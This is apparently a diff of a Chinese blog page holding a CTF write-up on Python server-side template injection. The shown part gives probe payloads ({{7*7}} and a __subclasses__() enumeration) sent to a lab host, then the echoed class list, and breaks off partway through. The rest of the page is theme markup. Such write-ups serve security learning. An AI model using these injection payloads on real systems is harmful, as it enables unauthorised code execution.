@@ -1,194 +1,440 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>攻防世界-Web_python_template_injection | gaifagafin's blog</title><meta name="author" content="gaifagafin"><meta name="copyright" content="gaifagafin"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#222222"><meta name="description" content="python模板注入......">
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=R:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.24/fancybox/fancybox.css" integrity="sha256-vQkngPS8jiHHH0I6ABTZroZk8NPZ7b+MUReOFE9UsXQ=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/silver/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"gaifagafin.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":true,"nav":null},"stickytabs":true,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInUp","post_block":"fadeIn","post_header":"fadeIn","post_body":"fadeIn","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":true}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="python模板注入......">
 <meta property="og:type" content="article">
 <meta property="og:title" content="攻防世界-Web_python_template_injection">
 <meta property="og:url" content="https://gaifagafin.github.io/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/index.html">
 <meta property="og:site_name" content="gaifagafin&#39;s blog">
 <meta property="og:description" content="python模板注入......">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img.gaifagafin.top/gaifagafin.jpg">
+<meta property="og:image" content="https://images.gaifagafin.top/202311051131161.png">
 <meta property="article:published_time" content="2023-10-31T07:07:48.000Z">
 <meta property="article:modified_time" content="2023-11-08T14:59:51.479Z">
 <meta property="article:author" content="gaifagafin">
 <meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Writeup">
 <meta property="article:tag" content="攻防世界">
 <meta property="article:tag" content="SSTI">
-<meta property="article:tag" content="Writeup">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img.gaifagafin.top/gaifagafin.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://gaifagafin.github.io/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
-  root: '/',
-  algolia: undefined,
-  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
-  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
-  noticeOutdate: undefined,
-  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
-  copy: {
-    success: '复制成功',
-    error: '复制错误',
-    noSupport: '浏览器不支持'
-  },
-  relativeDate: {
-    homepage: false,
-    post: false
-  },
-  runtime: '',
-  dateSuffix: {
-    just: '刚刚',
-    min: '分钟前',
-    hour: '小时前',
-    day: '天前',
-    month: '个月前'
-  },
-  copyright: undefined,
-  lightbox: 'fancybox',
-  Snackbar: undefined,
-  infinitegrid: {
-    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
-    buttonText: '加载更多'
-  },
-  isPhotoFigcaption: true,
-  islazyload: false,
-  isAnchor: false,
-  percent: {
-    toc: true,
-    rightside: true,
-  },
-  autoDarkmode: false
-}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
-  title: '攻防世界-Web_python_template_injection',
-  isPost: true,
-  isHome: false,
-  isHighlightShrink: false,
-  isToc: false,
-  postUpdate: '2023-11-08 22:59:51'
-}</script><script>(win=>{
-      win.saveToLocal = {
-        set: (key, value, ttl) => {
-          if (ttl === 0) return
-          const now = Date.now()
-          const expiry = now + ttl * 86400000
-          const item = {
-            value,
-            expiry
-          }
-          localStorage.setItem(key, JSON.stringify(item))
-        },
-      
-        get: key => {
-          const itemStr = localStorage.getItem(key)
-      
-          if (!itemStr) {
-            return undefined
-          }
-          const item = JSON.parse(itemStr)
-          const now = Date.now()
-      
-          if (now > item.expiry) {
-            localStorage.removeItem(key)
-            return undefined
-          }
-          return item.value
-        }
-      }
-    
-      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
-        const script = document.createElement('script')
-        script.src = url
-        script.async = true
-        script.onerror = reject
-        script.onload = script.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          script.onload = script.onreadystatechange = null
-          resolve()
-        }
+<meta name="twitter:image" content="https://images.gaifagafin.top/202311051131161.png">
 
-        Object.keys(attr).forEach(key => {
-          script.setAttribute(key, attr[key])
-        })
 
-        document.head.appendChild(script)
-      })
+<link rel="canonical" href="https://gaifagafin.github.io/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://gaifagafin.github.io/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/","path":"2023/10/31/攻防世界Web-python-template-injection/","title":"攻防世界-Web_python_template_injection"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>攻防世界-Web_python_template_injection | gaifagafin's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">gaifagafin's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">25</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">11</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">24</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">gaifagafin</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/gaifagafin" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;gaifagafin" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1454991831@qq.com" title="E-Mail → 1454991831@qq.com" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
     
-      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
-        const link = document.createElement('link')
-        link.rel = 'stylesheet'
-        link.href = url
-        if (id) link.id = id
-        link.onerror = reject
-        link.onload = link.onreadystatechange = function() {
-          const loadState = this.readyState
-          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
-          link.onload = link.onreadystatechange = null
-          resolve()
-        }
-        document.head.appendChild(link)
-      })
+        <div class="pjax">
+        </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://gaifagafin.github.io/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="gaifagafin">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="gaifagafin's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="攻防世界-Web_python_template_injection | gaifagafin's blog">
+      <meta itemprop="description" content="python模板注入......">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          攻防世界-Web_python_template_injection
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-10-31 15:07:48" itemprop="dateCreated datePublished" datetime="2023-10-31T15:07:48+08:00">2023-10-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-11-08 22:59:51" itemprop="dateModified" datetime="2023-11-08T22:59:51+08:00">2023-11-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/CTF-Writeup/" itemprop="url" rel="index"><span itemprop="name">CTF_Writeup</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">python模板注入......</div>
+        </div>
+      </header>
+
     
-      win.activateDarkMode = () => {
-        document.documentElement.setAttribute('data-theme', 'dark')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#222222')
-        }
-      }
-      win.activateLightMode = () => {
-        document.documentElement.setAttribute('data-theme', 'light')
-        if (document.querySelector('meta[name="theme-color"]') !== null) {
-          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'FFFFF0')
-        }
-      }
-      const t = saveToLocal.get('theme')
     
-        if (t === 'dark') activateDarkMode()
-        else if (t === 'light') activateLightMode()
-      
-      const asideStatus = saveToLocal.get('aside-status')
-      if (asideStatus !== undefined) {
-        if (asideStatus === 'hide') {
-          document.documentElement.classList.add('hide-aside')
-        } else {
-          document.documentElement.classList.remove('hide-aside')
-        }
-      }
     
-      const detectApple = () => {
-        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
-          document.documentElement.classList.add('apple')
-        }
-      }
-      detectApple()
-    })(window)</script><link rel="stylesheet" href="/static/css/github-dark-dimmed.css"><meta name="generator" content="Hexo 6.3.0"><style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://img.gaifagafin.top/gaifagafin.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 更多</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="gaifagafin's blog"><span class="site-name">gaifagafin's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 更多</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">攻防世界-Web_python_template_injection</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-31T07:07:48.000Z" title="发表于 2023-10-31 15:07:48">2023-10-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-08T14:59:51.479Z" title="更新于 2023-11-08 22:59:51">2023-11-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/CTF-Writeup/">CTF_Writeup</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="攻防世界-Web_python_template_injection"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><p>第一次做模板注入的题目，参考H师傅的writeup <a target="_blank" rel="noopener" href="https://blog.csdn.net/Mr_helloword/article/details/107949217">https://blog.csdn.net/Mr_helloword/article/details/107949217</a></p>
-<img src="https://images.gaifagafin.top/202311051131161.png" style="zoom:67%;" />
+    <div class="post-body" itemprop="articleBody"><p>第一次做模板注入的题目，参考H师傅的writeup <a target="_blank" rel="noopener" href="https://blog.csdn.net/Mr_helloword/article/details/107949217">https://blog.csdn.net/Mr_helloword/article/details/107949217</a></p>
+<img data-src="https://images.gaifagafin.top/202311051131161.png" style="zoom:67%;" />
 
 <p>进入靶机网址提示</p>
-<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino">python <span class="hljs-keyword">template</span> injection<br></code></pre></td></tr></table></figure>
+<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">python <span class="keyword">template</span> injection</span><br></pre></td></tr></table></figure>
 
 <p>知道这是一道python模板注入</p>
 <p>url输入 </p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;7*7&#125;&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>页面回显</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/49 not found<br></code></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/49 not found</span><br></pre></td></tr></table></figure>
 
 <p>判断存在SSTI注入</p>
 <p>查看网站模块，url输入</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>回显</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">URL http://<span class="hljs-number">61.147</span><span class="hljs-number">.171</span><span class="hljs-number">.105</span>:<span class="hljs-number">50859</span>/[&lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;type&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;int&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;super&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;xrange&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;set&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;float&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;long&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;property&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;code&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;function&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;module&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.stat_result&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.statvfs_result&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span 